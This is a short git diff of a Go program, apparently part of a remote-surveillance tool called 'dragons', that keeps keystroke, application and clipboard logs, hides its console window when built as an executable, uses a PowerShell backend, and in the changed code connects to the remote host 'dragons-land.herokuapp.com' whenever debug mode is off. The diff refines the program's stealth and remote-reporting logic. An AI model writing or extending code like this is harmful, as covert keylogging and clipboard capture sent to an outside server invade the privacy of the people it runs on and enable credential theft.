@@ -21,13 +21,12 @@ import (
 	"github.com/d0minikt/dragons/target/platform"
 )
 
-var debug = false
-
 var (
 	client       = ""
 	keylog       = []string{}
 	applog       = []string{}
 	clipboardlog = []string{}
+	debug        bool
 )
 
 // HideWindow hides the current console window that appears when compiled to exe
@@ -41,16 +40,19 @@ func HideWindow() {
 	}
 }
 
-func main() {
+func init() {
 	flag.BoolVar(&debug, "debug", false, "Debug mode")
-	addr := "dragons-land.herokuapp.com"
+}
+
+func main() {
+	flag.Parse()
+
+	addr := "0.0.0.0"
+	log.Println(debug)
 	if !debug {
 		HideWindow()
-		addr = "0.0.0.0"
+		addr = "dragons-land.herokuapp.com"
 	}
-
-	flag.Parse()
-	log.SetFlags(0)
 
 	// powershell
 	backend := &backend.Local{}
